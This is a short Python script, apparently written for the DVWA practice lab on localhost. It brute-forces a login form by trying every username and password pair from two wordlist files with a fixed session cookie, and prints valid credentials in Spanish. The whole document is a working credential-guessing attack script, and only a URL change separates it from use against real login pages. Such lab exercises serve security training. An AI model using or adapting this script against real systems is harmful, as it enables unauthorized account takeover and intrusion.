import requests

url = "http://localhost:8080/vulnerabilities/brute/"

with open("users.txt", "r") as f:
    users = [line.strip() for line in f]

with open("passwords.txt", "r") as f:
    passwords = [line.strip() for line in f]

cookies = {
    "PHPSESSID": "2362de30077e03ee8000b107110954d8",
    "security": "low"
}

for user in users:
    for pwd in passwords:
        params = {
            "username": user,
            "password": pwd,
            "Login": "Login"
        }

        response = requests.get(url, params=params, cookies=cookies)

        if "Welcome" in response.text:
            print(f"[+] Credencial válida: {user}:{pwd}")
        else:
            print(f"[-] Falló: {user}:{pwd}")